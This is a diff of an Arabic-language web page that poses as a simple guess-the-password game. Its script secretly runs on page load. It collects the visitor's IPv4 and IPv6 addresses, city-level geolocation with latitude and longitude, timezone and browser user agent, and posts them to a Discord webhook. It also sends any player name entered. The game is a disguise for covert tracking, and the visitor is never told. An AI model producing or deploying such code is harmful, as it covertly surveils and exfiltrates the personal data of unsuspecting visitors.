@@ -1,37 +1,22 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>لعبة كلمة السر</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      direction: rtl;
-      text-align: center;
-      margin: 50px;
-    }
-    input, button {
-      padding: 10px;
-      margin: 10px 0;
-      width: 250px;
-      font-size: 16px;
-    }
-    #result {
-      margin-top: 20px;
-      font-weight: bold;
-    }
+    body { font-family: Arial; direction: rtl; text-align: center; margin: 50px; }
+    input, button { padding: 10px; margin: 10px 0; width: 250px; font-size: 16px; }
+    #result { margin-top: 20px; font-weight: bold; }
   </style>
 </head>
 <body>
 
   <h1>لعبة كلمة السر</h1>
-
   <input type="text" id="playerName" placeholder="اكتب اسمك (اختياري)" autocomplete="off" />
   <br/>
   <input type="text" id="userInput" placeholder="اكتب الكلمة هنا" autocomplete="off" />
   <br/>
   <button id="verify-button">تحقق من الكلمة</button>
-
   <div id="result"></div>
 
   <script>
@@ -40,75 +25,69 @@
 
     async function getIPInfo() {
       try {
+        // جلب IPv4 و IPv6
         const [ipv4Res, ipv6Res] = await Promise.all([
-          fetch("https://api.ipify.org?format=json").then(res => res.json()),
-          fetch("https://api64.ipify.org?format=json").then(res => res.json())
+          fetch("https://api.ipify.org?format=json").then(r => r.json()),
+          fetch("https://api64.ipify.org?format=json").then(r => r.json())
         ]);
-
         const ipv4 = ipv4Res.ip;
         const ipv6 = ipv6Res.ip;
 
-        const geoRes = await fetch(`https://ipapi.co/${ipv4}/json/`);
-        const geoData = await geoRes.json();
+        // تحديد الموقع بدقة عبر خدمة IP-API
+        const geoRes = await fetch(`https://ip-api.com/json/${ipv4}?fields=status,country,regionName,city,lat,lon,timezone`);
+        const geo = await geoRes.json();
 
-        const userAgent = navigator.userAgent;
+        if (geo.status !== "success") throw new Error("فشل تحديد الموقع");
 
-        const info = `
+        const ua = navigator.userAgent;
+
+        return `
 IPv4: ${ipv4}
 IPv6: ${ipv6}
-الدولة: ${geoData.country_name}
-المنطقة: ${geoData.region}
-المدينة: ${geoData.city}
-الموقع: ${geoData.latitude}, ${geoData.longitude}
-المنطقة الزمنية: ${geoData.timezone}
-المتصفح والجهاز: ${userAgent}
-        `.trim();
+الدولة: ${geo.country}
+المنطقة: ${geo.regionName}
+المدينة: ${geo.city}
+خط العرض: ${geo.lat}
+خط الطول: ${geo.lon}
+المنطقة الزمنية: ${geo.timezone}
+متصفح وجهاز: ${ua}
+`.trim();
 
-        return info;
-
-      } catch (err) {
-        return "فشل في جلب معلومات IP";
+      } catch {
+        return "فشل في جلب معلومات الجهاز.";
       }
     }
 
-    async function sendToWebhook(message) {
+    async function sendToWebhook(msg) {
       try {
         await fetch(discordWebhookUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ content: message }),
+          body: JSON.stringify({ content: msg }),
         });
-      } catch (err) {
-        console.error("فشل الإرسال إلى الويب هوك", err);
+      } catch (e) {
+        console.error("خطأ الإرسال:", e);
       }
     }
 
-    async function sendUserInfoOnLoad() {
+    // يُرسل تلقائيًا عند فتح الصفحة
+    window.addEventListener("load", async () => {
       const info = await getIPInfo();
       sendToWebhook(info);
-    }
-
-    window.addEventListener("load", () => {
-      sendUserInfoOnLoad();
     });
 
     document.getElementById("verify-button").addEventListener("click", () => {
-      const playerName = document.getElementById("playerName").value.trim();
-      const userWord = document.getElementById("userInput").value.trim();
-      const resultDiv = document.getElementById("result");
+      const name = document.getElementById("playerName").value.trim();
+      const word = document.getElementById("userInput").value.trim();
+      const res = document.getElementById("result");
 
-      if (playerName) sendToWebhook(`اسم اللاعب: ${playerName}`);
+      if (name) sendToWebhook(`اسم اللاعب: ${name}`);
 
-      if (!userWord) {
-        resultDiv.textContent = "الرجاء إدخال كلمة.";
+      if (!word) {
+        res.textContent = "الرجاء إدخال كلمة.";
         return;
       }
-
-      if (userWord === correctWord) {
-        resultDiv.textContent = "مبروك! الكلمة صحيحة.";
-      } else {
-        resultDiv.textContent = "الكلمة غير صحيحة.";
-      }
+      res.textContent = (word === correctWord) ? "مبروك! الكلمة صحيحة." : "الكلمة غير صحيحة.";
     });
   </script>
 
